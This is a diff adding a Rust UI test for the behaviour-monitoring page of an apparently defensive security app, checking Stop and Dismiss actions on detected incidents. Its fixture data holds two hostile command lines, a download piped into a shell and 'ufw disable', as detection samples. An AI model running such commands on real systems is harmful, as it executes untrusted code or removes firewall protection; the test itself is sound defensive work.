@@ -221,6 +221,39 @@ fn command_centre_interface() {
     qalaa_command::set_credentials(&app, &[], &mode);
     assert_eq!(labelled(&app, "No unexpected program has opened your credentials.").len(), 1);
 
+    // --- Behaviour: a rule match with Stop / Dismiss; finished ones offer no buttons.
+    let status: qalaa_ipc::BehaviourStatus = serde_json::from_value(serde_json::json!({
+        "enabled": true, "rules": 8, "rulesVersion": "2026.11.25.1",
+        "capability": {"source": "proc_poll", "intervalMs": 1000, "seesShortLived": false, "note": ""},
+        "incidents": [
+            {"id": "b1", "rule": "download_piped_to_shell", "title": "A download is run straight in a shell", "description": "", "technique": "T1059.004", "level": "medium", "pid": 30, "program": "sh", "parent": "bash", "commandLine": "sh -c curl x | sh", "at": "2026-11-24T09:59:00Z", "state": "open"},
+            {"id": "b2", "rule": "firewall_disabled", "title": "The firewall is being switched off or emptied", "description": "", "technique": "T1562.004", "level": "high", "pid": 31, "program": "sh", "parent": "bash", "commandLine": "ufw disable", "at": "2026-11-24T09:58:00Z", "state": "stopped"}
+        ]
+    }))
+    .expect("status");
+    let (rows, note) = qalaa_command::view::behaviour_view(&status, now, Lang::En);
+    qalaa_command::set_behaviour(&app, &rows, &note);
+    app.set_page("behaviour".into());
+    let beh = Rc::new(RefCell::new(Vec::<String>::new()));
+    {
+        let beh = Rc::clone(&beh);
+        app.on_beh_action(move |id, action| beh.borrow_mut().push(format!("{action} {id}")));
+    }
+    labelled(&app, "Stop program: A download is run straight in a shell: sh")[0].invoke_accessible_default_action();
+    labelled(&app, "Dismiss: A download is run straight in a shell: sh")[0].invoke_accessible_default_action();
+    assert_eq!(*beh.borrow(), vec!["stop b1".to_owned(), "dismiss b1".to_owned()]);
+    assert!(
+        labelled(
+            &app,
+            "Stop program: The firewall is being switched off or emptied: sh  · High risk  · Stopped"
+        )
+        .is_empty(),
+        "a stopped program offers no actions"
+    );
+    assert_eq!(labelled(&app, &note).len(), 1, "the page says what polling can miss");
+    qalaa_command::set_behaviour(&app, &[], &note);
+    assert_eq!(labelled(&app, "No new program has matched a behaviour rule.").len(), 1);
+
     // --- Data brokers: open, mark, and the request letter needs a name and email first.
     let status: qalaa_ipc::BrokerStatus = serde_json::from_value(serde_json::json!({
         "catalogVersion": "2026-11-25", "reviewed": null, "note": "", "done": 0, "recheckDue": 0,
